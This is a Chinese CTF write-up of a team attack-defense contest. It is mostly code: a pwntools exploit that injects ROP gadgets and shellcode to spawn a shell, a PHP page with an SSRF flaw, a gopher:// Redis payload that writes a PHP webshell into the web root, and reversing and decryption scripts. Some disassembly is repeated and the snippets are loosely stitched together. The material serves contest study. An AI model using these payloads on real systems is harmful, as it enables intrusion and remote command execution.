# 矩阵杯战队攻防对抗赛 writeup by Mini-Venom

> 原文: https://www.ctfiot.com/185208.html
> ID: 185208

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组

还有一段base58，最后exec是执行，那就直接解码之后看看

  3           0 LOAD_CONST               0 (0)
              2 LOAD_CONST               1 (None)
              4 IMPORT_NAME              0 (random)
              6 STORE_NAME               0 (random)

  5           8 LOAD_CONST               2 (b'x18xfaxaddxedxabxadx9dxe5xc0xadxfaxf9x0bexf9xe5xade6xf9xfdx88xf9x9dxe5x9cxe5x9dexc3))x0fxff')
             10 STORE_NAME               1 (encdata)

 12          12 LOAD_CONST               3 (<code object generate_key at 0x000001906F646340, file "run.py", line 5>)
             14 LOAD_CONST               4 ('generate_key')
             16 MAKE_FUNCTION            0
             18 STORE_NAME               2 (generate_key)

 19          20 LOAD_CONST               5 (<code object encrypt at 0x000001906F644F50, file "run.py", line 12>)
             22 LOAD_CONST               6 ('encrypt')
             24 MAKE_FUNCTION            0
             26 STORE_NAME               3 (encrypt)

 20          28 SETUP_FINALLY           58 (to 146)

 21          30 LOAD_NAME                4 (input)
             32 LOAD_CONST               7 ('input your flag:')
             34 CALL_FUNCTION            1
             36 STORE_NAME               5 (flag)

 22          38 LOAD_NAME                2 (generate_key)
             40 LOAD_NAME                6 (len)
             42 LOAD_NAME                5 (flag)
             44 CALL_FUNCTION            1
             46 CALL_FUNCTION            1
             48 STORE_NAME               7 (key)

 23          50 LOAD_NAME                5 (flag)
             52 LOAD_METHOD              8 (encode)
             54 CALL_METHOD              0
             56 STORE_NAME               9 (data)

 25          58 LOAD_NAME                3 (encrypt)
             60 LOAD_NAME                9 (data)
             62 LOAD_NAME                7 (key)
             64 CALL_FUNCTION            2
             66 STORE_NAME              10 (encrypted_data)

 26          68 LOAD_NAME               10 (encrypted_data)
             70 LOAD_NAME                1 (encdata)
             72 COMPARE_OP               2 (==)
             74 POP_JUMP_IF_FALSE       84 (to 168)

 27          76 LOAD_NAME               11 (print)
             78 LOAD_CONST               8 ('good')
             80 CALL_FUNCTION            1
             82 POP_TOP
             84 POP_BLOCK
             86 JUMP_FORWARD            12 (to 112)

 28          88 POP_TOP
             90 POP_TOP
             92 POP_TOP
             94 POP_EXCEPT
             96 JUMP_FORWARD             2 (to 102)
             98 <88>
            100 LOAD_CONST               1 (None)
        >>  102 RETURN_VALUE

Disassembly of <code object generate_key at 0x000001906F646340, file "run.py", line 5>:
  8           0 LOAD_GLOBAL              0 (list)
              2 LOAD_GLOBAL              1 (range)
              4 LOAD_CONST               1 (256)
              6 CALL_FUNCTION            1
              8 CALL_FUNCTION            1
             10 STORE_FAST               1 (key)

  9          12 LOAD_GLOBAL              2 (random)
             14 LOAD_METHOD              3 (seed)
             16 LOAD_FAST                0 (seed_value)
             18 CALL_METHOD              1
             20 POP_TOP

 10          22 LOAD_GLOBAL              2 (random)
             24 LOAD_METHOD              4 (shuffle)
             26 LOAD_FAST                1 (key)
             28 CALL_METHOD              1
             30 POP_TOP
             32 LOAD_GLOBAL              5 (bytes)
             34 LOAD_FAST                1 (key)
             36 CALL_FUNCTION            1
             38 RETURN_VALUE

Disassembly of <code object encrypt at 0x000001906F644F50, file "run.py", line 12>:
 15           0 LOAD_GLOBAL              0 (bytearray)
              2 CALL_FUNCTION            0
              4 STORE_FAST               2 (encrypted)

 16           6 LOAD_FAST                0 (data)
              8 GET_ITER
             10 FOR_ITER                22 (to 56)
             12 STORE_FAST               3 (byte)

 17          14 LOAD_FAST                2 (encrypted)
             16 LOAD_METHOD              1 (append)
             18 LOAD_FAST                1 (key)
        >>   20 LOAD_FAST                3 (byte)
             22 BINARY_SUBSCR
             24 LOAD_CONST               1 (95)
             26 BINARY_XOR
             28 CALL_METHOD              1
             30 POP_TOP
             32 JUMP_ABSOLUTE           10 (to 20)
             34 LOAD_GLOBAL              2 (bytes)
             36 LOAD_FAST                2 (encrypted)
             38 CALL_FUNCTION            1
             40 RETURN_VALUE


```
from pwn import *

p = process('./main')
context.arch = 'x86'
p.recvuntil('@:')
p.sendline('1')
p.recvuntil('ame:')
p.sendline('user')
p.recvuntil('ord:')
p.sendline('ozrrvnqc')
p.recvuntil('@:')
p.sendline('6')
p.recvuntil('@:')
p.sendline('3')
p.recvuntil('set:')
p.sendline('10')
p.recvuntil('pt: ')
p.sendline('k'*20)
push_eax = 0x5b597483
pop_eax = 0x5b597a33
push_ebx = 0x5b597603
pop_ebx = 0x5b597ba3
push_ecx = 0x5b59749b
pop_ecx = 0x5b597a3b
push_edx=0x5b59754e
pop_edx = 0x5b597aee
int_80 = 0x5dde8fe0
p.sendline(str(push_eax))
p.sendline(str(push_ebx))
p.sendline(str(push_ecx))
p.sendline(str(push_edx))
p.sendline(str(pop_eax))
p.sendline(str(pop_ebx))
p.sendline(str(pop_edx))
p.sendline(str(pop_ecx))
p.sendline(str(int_80))
p.sendline('1')
p.sendline(b'a'*0x22+asm(shellcraft.sh()))
p.interactive()

爆破脚本：
    #include<stdio.h>
    #include<string.h>
int main() {
        long long a;
        long double v11;
        int v4;
        //FILE* fp = fopen("shell.txt", "w");
        float v2;
        float v5;
        float v3;
        for (int i = 0x10000; i < 0x100000000 - 1; i++) {
                v4 = i;
                v11 = (long double)v4 / (long double)0xb4;
                v2 = v11;
                v5 = v2;
                v3 = v11;
                if (*((unsigned char*)&v5 + 3) <= 0x4a) {
                        continue;
                }
                if((*(int *)&v3)%0x1000000==0x01eb53&&v3>0){
                        printf("%#x %#x %llfn", v4,*(int *)&v3, v11);
                        break;
                        //fprintf(fp, "%#x %#x %llfn", v4, *(int*)&v3, v11);
                }
                //if (i % 0x10000 == 0)fflush(fp);
        }
        //fclose(fp);
}
<?php
error_reporting(0);
// error_reporting(E_ALL & ~E_WARNING);
// highlight_file(__FILE__);
$url=$_POST['data'];
$ch=curl_init($url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result=curl_exec($ch);
curl_close($ch);
echo ($result);
?>
POST /aaabbb.php HTTP/1.1
Host: web-24ddad8d15.challenge.xctf.org.cn
Content-Length: 433
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://web-05574678fa.challenge.xctf.org.cn
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://web-05574678fa.challenge.xctf.org.cn/aaabbb.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

data=gopher%3a//127.0.0.1%3a6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
import base58
import zlib
import marshal

try:
    scrambled_code_string = b'X1XehTQeZCsb4WSLBJBYZMjovD1x1E5wjTHh2w3j8dDxbscVa6HLEBSUTPEMsAcerwYASTaXFsCmWb1RxBfwBd6RmyePv3AevTDUiFAvV1GB94eURvtdrpYez7dF1egrwVz3EcQjHxXrpLXs2APE4MS93sMsgMgDrTFCNwTkPba31Aa2FeCSMu151LvEpwiPq5hvaZQPaY2s4pBpH16gGDoVb9MEvLn5J4cP23rEfV7EzNXMgqLUKF82mH1v7yjVCtYQhR8RprKCCtD3bekHjBH2AwES4QythgjVetUNDRpN5gfeJ99UYbZn1oRQHVmiu1sLjpq2mMm8tTuiZgfMfsktf5Suz2w8DgRX4qBKQijnuU4Jou9hduLeudXkZ85oWx9SU7MCE6gjsvy1u57VYw33vckJU6XGGZgZvSqKGR5oQKJf8MPNZi1dF8yF9MkwDdEq59jFsRUJDv7kNwig8XiuBXvmtJPV963thXCFQWQe8XGSu7kJqeRaBX1pkkQ4goJpgTLDHR1LW7bGcZ7m13KzW5mVmJHax81XLis774FjwWpApmTVuiGC2TQr2RcyUTkhGgC8R4bQiXgCsqZMoWyafcSmjdZsHmE6WgNAqPQmEg9FyjpK5f2XC1DkzuyHan5YceeEDMxKUJgJrmNcdGxB7281EyeriyuWNJVH2rVNhio6yoG'
    exec(marshal.loads(zlib.decompress(base58.b58decode(scrambled_code_string))))
finally:
    pass
return None
3           0 LOAD_CONST               0 (0)
              2 LOAD_CONST               1 (None)
              4 IMPORT_NAME              0 (random)
              6 STORE_NAME               0 (random)

  5           8 LOAD_CONST               2 (b'x18xfaxaddxedxabxadx9dxe5xc0xadxfaxf9x0bexf9xe5xade6xf9xfdx88xf9x9dxe5x9cxe5x9dexc3))x0fxff')
             10 STORE_NAME               1 (encdata)

 12          12 LOAD_CONST               3 (<code object generate_key at 0x000001906F646340, file "run.py", line 5>)
             14 LOAD_CONST               4 ('generate_key')
             16 MAKE_FUNCTION            0
             18 STORE_NAME               2 (generate_key)

 19          20 LOAD_CONST               5 (<code object encrypt at 0x000001906F644F50, file "run.py", line 12>)
             22 LOAD_CONST               6 ('encrypt')
             24 MAKE_FUNCTION            0
             26 STORE_NAME               3 (encrypt)

 20          28 SETUP_FINALLY           58 (to 146)

 21          30 LOAD_NAME                4 (input)
             32 LOAD_CONST               7 ('input your flag:')
             34 CALL_FUNCTION            1
             36 STORE_NAME               5 (flag)

 22          38 LOAD_NAME                2 (generate_key)
             40 LOAD_NAME                6 (len)
             42 LOAD_NAME                5 (flag)
             44 CALL_FUNCTION            1
             46 CALL_FUNCTION            1
             48 STORE_NAME               7 (key)

 23          50 LOAD_NAME                5 (flag)
             52 LOAD_METHOD              8 (encode)
             54 CALL_METHOD              0
             56 STORE_NAME               9 (data)

 25          58 LOAD_NAME                3 (encrypt)
             60 LOAD_NAME                9 (data)
             62 LOAD_NAME                7 (key)
             64 CALL_FUNCTION            2
             66 STORE_NAME              10 (encrypted_data)

 26          68 LOAD_NAME               10 (encrypted_data)
             70 LOAD_NAME                1 (encdata)
             72 COMPARE_OP               2 (==)
             74 POP_JUMP_IF_FALSE       84 (to 168)

 27          76 LOAD_NAME               11 (print)
             78 LOAD_CONST               8 ('good')
             80 CALL_FUNCTION            1
             82 POP_TOP
             84 POP_BLOCK
             86 JUMP_FORWARD            12 (to 112)

 28          88 POP_TOP
             90 POP_TOP
             92 POP_TOP
             94 POP_EXCEPT
             96 JUMP_FORWARD             2 (to 102)
             98 <88>
            100 LOAD_CONST               1 (None)
        >>  102 RETURN_VALUE

Disassembly of <code object generate_key at 0x000001906F646340, file "run.py", line 5>:
  8           0 LOAD_GLOBAL              0 (list)
              2 LOAD_GLOBAL              1 (range)
              4 LOAD_CONST               1 (256)
              6 CALL_FUNCTION            1
              8 CALL_FUNCTION            1
             10 STORE_FAST               1 (key)

  9          12 LOAD_GLOBAL              2 (random)
             14 LOAD_METHOD              3 (seed)
             16 LOAD_FAST                0 (seed_value)
             18 CALL_METHOD              1
             20 POP_TOP

 10          22 LOAD_GLOBAL              2 (random)
             24 LOAD_METHOD              4 (shuffle)
             26 LOAD_FAST                1 (key)
             28 CALL_METHOD              1
             30 POP_TOP
             32 LOAD_GLOBAL              5 (bytes)
             34 LOAD_FAST                1 (key)
             36 CALL_FUNCTION            1
             38 RETURN_VALUE

Disassembly of <code object encrypt at 0x000001906F644F50, file "run.py", line 12>:
 15           0 LOAD_GLOBAL              0 (bytearray)
              2 CALL_FUNCTION            0
              4 STORE_FAST               2 (encrypted)

 16           6 LOAD_FAST                0 (data)
              8 GET_ITER
             10 FOR_ITER                22 (to 56)
             12 STORE_FAST               3 (byte)

 17          14 LOAD_FAST                2 (encrypted)
             16 LOAD_METHOD              1 (append)
             18 LOAD_FAST                1 (key)
        >>   20 LOAD_FAST                3 (byte)
             22 BINARY_SUBSCR
             24 LOAD_CONST               1 (95)
             26 BINARY_XOR
             28 CALL_METHOD              1
             30 POP_TOP
             32 JUMP_ABSOLUTE           10 (to 20)
             34 LOAD_GLOBAL              2 (bytes)
             36 LOAD_FAST                2 (encrypted)
             38 CALL_FUNCTION            1
             40 RETURN_VALUE
import random

def generate_key(seed_value):
    key = list(range(256))
    random.seed(seed_value)
    random.shuffle(key)
    return bytes(key)

def decrypt(encrypted_data, key):
    decrypted = bytearray()
    for byte in encrypted_data:
        decrypted.append(key.index(byte ^ 95)) 
    return bytes(decrypted).decode()

encdata = b'x18xfaxaddxedxabxadx9dxe5xc0xadxfaxf9x0bexf9xe5xade6xf9xfdx88xf9x9dxe5x9cxe5x9dexc3))x0fxff'

flag_length = len(encdata)

key = generate_key(flag_length)

flag = decrypt(encdata, key)
print(flag)
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/06/1-1717370448.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/06/1-1717370449.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/06/8-1717370450.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/06/6-1717370451.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/06/4-1717370452.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/06/4-1717370453.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/06/1-1717370455.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/06/4-1717370456.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/06/8-1717370457.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/06/3-1717370457.png)